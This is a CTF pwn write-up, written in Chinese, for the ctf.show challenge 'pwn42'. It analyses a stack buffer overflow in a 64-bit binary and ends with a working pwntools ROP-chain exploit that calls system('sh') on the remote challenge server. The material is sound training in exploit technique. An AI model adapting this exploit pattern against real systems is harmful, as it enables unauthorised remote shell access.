```
tasike@tasike-VM:~/Desktop$ chmod 777 pwn42
```

```
tasike@tasike-VM:~/Desktop$ file pwn42
pwn42: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=60afd2be7fa97f11b4f1347e83ff90034693b427, not stripped
```

```
tasike@tasike-VM:~/Desktop$ checksec pwn42
[*] '/home/tasike/Desktop/pwn42'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

64bit，堆栈不可执行

`ida`查看

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  setvbuf(_bss_start, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  logo();
  ctfshow();
  puts("\nExit");
  return 0;
}
```

跟进`ctfshow`

```c
ssize_t ctfshow()
{
  char buf[10]; // [rsp+6h] [rbp-Ah] BYREF

  return read(0, buf, 0x32uLL);
}
```

> `buf`与`rbp`距离`0xA`

有`_system`

```c
// attributes: thunk
int system(const char *command)
{
  return system(command);
}
```

没有`/bin/sh`

但是在`useful`函数中发现了`sh`

```c
int useful()
{
  return printf("sh");
}
```

跟进`sh`

```
.rodata:0000000000400872 73 68 00                      format db 'sh',0
```

查看`poprdi`

```
tasike@tasike-VM:~/Desktop$ ROPgadget --binary pwn42 --only "pop|ret"
Gadgets information
============================================================
0x000000000040083c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040083e : pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400840 : pop r14 ; pop r15 ; ret
0x0000000000400842 : pop r15 ; ret
0x000000000040083b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040083f : pop rbp ; pop r14 ; pop r15 ; ret
0x0000000000400608 : pop rbp ; ret
0x0000000000400843 : pop rdi ; ret
0x0000000000400841 : pop rsi ; pop r15 ; ret
0x000000000040083d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040053e : ret
0x0000000000400542 : ret 0x201a

Unique gadgets found: 12
```

查看`ret`

```
tasike@tasike-VM:~/Desktop$ ROPgadget --binary pwn42 --only "ret"
Gadgets information
============================================================
0x000000000040053e : ret
0x0000000000400542 : ret 0x201a

Unique gadgets found: 2
```



编写`attack42.py`

```python
from pwn import *
context(os = 'Linux', arch = 'amd64', log_level = 'debug')
r = remote('pwn.challenge.ctf.show', 28287)
poprdi = 0x400843
sh = 0x400872
ret = 0x40053e
system = 0x400560
payload = cyclic(0xA + 0x8) + p64(poprdi) + p64(sh) + p64(ret) + p64(system)
r.sendline(payload)
r.interactive()
```

